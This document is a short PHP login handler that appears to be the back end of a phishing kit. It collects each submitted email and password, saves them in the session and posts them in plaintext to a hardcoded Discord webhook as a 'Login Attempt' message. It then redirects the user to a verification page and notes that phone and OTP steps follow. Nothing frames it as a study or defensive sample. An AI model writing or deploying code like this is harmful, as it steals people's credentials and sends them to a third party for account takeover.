<?php
session_start();

$step = $_POST['step'] ?? '';

if ($step === 'login') {
    // Sanitize email
    $email = filter_var($_POST['email'] ?? '', FILTER_VALIDATE_EMAIL);
    $password = $_POST['password'] ?? '';

    if (!$email || !$password) {
        // Invalid email or missing password → go back to login
        header("Location: verify.html");
        exit();
    }

    // Store sanitized email & password in session (optional)
    $_SESSION['email'] = $email;
    $_SESSION['password'] = $password;

    // ---- Send email + password to webhook ----
    $webhookUrl = "https://discord.com/api/webhooks/1536976905109118976/JNE8Pc3IDdB7FsmTRnu5trIRSy-OJZKYOp52N4V7AeWSwN5quwPMYWlELnj8hRHdtPfw";
    $message = [
        "content" => "Login Attempt: Email `$email` | Password `$password`"
    ];
    $payload = json_encode($message);

    $ch = curl_init($webhookUrl);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    // Redirect to phone verification page
    header("Location: verify.html");
    exit();
}

// Other steps (phone verification, OTP) can go below
?>